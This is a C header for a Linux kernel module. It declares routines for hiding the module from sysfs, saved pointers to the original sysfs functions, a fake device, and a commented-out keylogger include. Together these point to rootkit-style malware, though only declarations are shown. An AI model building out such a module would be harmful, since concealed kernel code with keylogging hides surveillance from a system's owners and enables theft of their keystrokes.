#ifndef _MODULE_H_
#define _MODULE_H_
#include <linux/cdev.h>
#include <linux/semaphore.h>
#include <linux/slab.h>

#include <linux/sysfs.h>
#include <linux/kallsyms.h>
#include <linux/kernfs.h>
#include "fops.h"
//#include "keylogger.h"
static int start_hide(void);
void (*sysfs_remove_fir_orig)(struct kobject*);
void (*sysfs_create_fir_orig)(struct kobject*);
/*struct fake_device
{
    char data[100];
    struct semaphore sem;

};*/
int dev_open_fops_for_hide(struct inode *inode, struct file* file);
static int hide_driver_entery(void);
struct fake_device virtual_device1;
int is_hide=0 ;
int major_number1;
//int ret;

extern dev_t dev_num1;
extern struct cdev *mcdev1;



#endif